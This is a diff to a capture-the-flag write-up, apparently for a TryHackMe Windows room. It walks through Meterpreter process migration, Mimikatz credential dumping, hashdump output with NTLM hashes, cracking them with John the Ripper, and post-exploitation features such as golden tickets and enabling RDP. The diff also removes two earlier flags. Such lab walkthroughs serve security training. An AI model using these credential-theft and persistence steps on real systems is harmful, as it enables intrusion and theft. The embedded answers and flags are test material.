@@ -365,22 +365,118 @@ SeSystemtimePrivilege
 
 ## Task 5 - Looting
 
+Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 20-22-59.png" alt=""><figcaption></figcaption></figure>
 
+In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
 
+### 5.1 - Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 20-26-37.png" alt=""><figcaption></figcaption></figure>
 
+{% hint style="info" %}
+spoolsv.exe
+{% endhint %}
 
+Migrate to this process now with the command `migrate -N PROCESS_NAME`
 
+```
+migrate 1372 spoolsv.exe
+```
 
+<div align="left">
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 20-33-38.png" alt=""><figcaption></figcaption></figure>
 
+</div>
 
+### 5.2 - Let's check what user we are now with the command \`getuid\`. What user is listed?
 
+```
+getuid
+```
 
+<div align="left">
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 20-33-10.png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+{% hint style="info" %}
+NT AUTHORITY\SYSTEM
+{% endhint %}
+
+Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
+
+```
+load kiwi
+```
+
+Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.
+
+### 5.3 - Which command allows up to retrieve all credentials?
+
+{% hint style="info" %}
+```
+creds_all
+```
+{% endhint %}
+
+### 5.4 - Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)
+
+```
+hashdump
+```
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+We save them in a txt files: hashes.txt, then we use John the Ripper to crack them:
+
+```bash
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+<details>
+
+<summary>🚩 Dark's password</summary>
+
+Password01!
+
+</details>
 
 ## Task 6 - Post-Exploitation
 
+Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.
+
+### 6.1 - What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)
+
+
+
+
+
+{% hint style="info" %}
+
+{% endhint %}
+
+### 6.2 - While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?
+
+\
+
+
+
+
+
+
+{% hint style="info" %}
+
+{% endhint %}
+
+### 6.3 - How about if we wanted to record from a microphone attached to the system?
 
 
 
@@ -388,6 +484,11 @@ SeSystemtimePrivilege
 
 
 
+{% hint style="info" %}
+
+{% endhint %}
+
+### 6.4 - To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.
 
 
 
@@ -395,18 +496,13 @@ SeSystemtimePrivilege
 
 
 
+{% hint style="info" %}
 
+{% endhint %}
 
+Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?
 
-
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
-THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
-
-</details>
-
+### 6.5 - Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
 
 
 
@@ -414,19 +510,8 @@ THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 
 
 
+{% hint style="info" %}
 
+{% endhint %}
 
-
-
-
-
-
-
-
-<details>
-
-<summary>🚩 Flag 2 (root.txt)</summary>
-
-THM{f963aaa6a430f210222158ae15c3d76d}
-
-</details>
+One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: \`run post/windows/manage/enable\_rdp\`
